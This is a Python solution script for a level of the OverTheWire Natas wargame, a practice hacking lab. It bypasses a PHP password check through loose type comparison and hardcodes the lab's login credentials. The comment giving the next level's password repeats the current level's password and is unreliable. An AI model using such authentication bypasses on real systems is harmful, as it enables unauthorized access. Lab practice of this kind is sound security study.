#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas23"
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

post_data = {"passwd": "100iloveyou"}

response = session.post(url, data=post_data, auth=(username, password))
content = response.text

soup = BeautifulSoup(content, "html.parser").prettify()

print(soup)
print("=" * 80)


# this time we got an /index-source.html
# the password that the server expects is something string
# that should has 'iloveyou' but at the same time
# it's something integer that should be greater than 10
# fortunately, php has that 'cool' type conversion, so
# if we post the passwd='100iloveyou' that would fullfil
# the two conditions, first it has that 'iloveyou' in it
# second, when you compare it with 10 it would be greater
# because 100 > 10
#
# we got it right:
# Username: natas24
# Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
